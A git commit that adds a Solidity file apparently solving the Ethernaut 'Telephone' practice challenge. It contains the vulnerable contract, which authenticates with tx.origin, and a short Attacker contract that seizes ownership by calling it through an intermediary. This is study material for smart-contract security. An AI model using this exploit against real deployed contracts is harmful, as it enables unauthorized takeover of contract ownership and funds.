9135c357e8db3618020917520f9aa51c8be1cd42
ivline11 <ivline70@naver.com>
2024-10-08 11:27:22 +0900

    ethernaut

---
+++ contracts/telephone.sol
@@ -0,0 +1,26 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+
+contract Attacker{
+    Telephone telephone;
+    function attacker(address _address) public{
+        telephone = Telephone(_address);    
+    }
+    function attack() public{
+        telephone.changeOwner(msg.sender);
+    }
+}
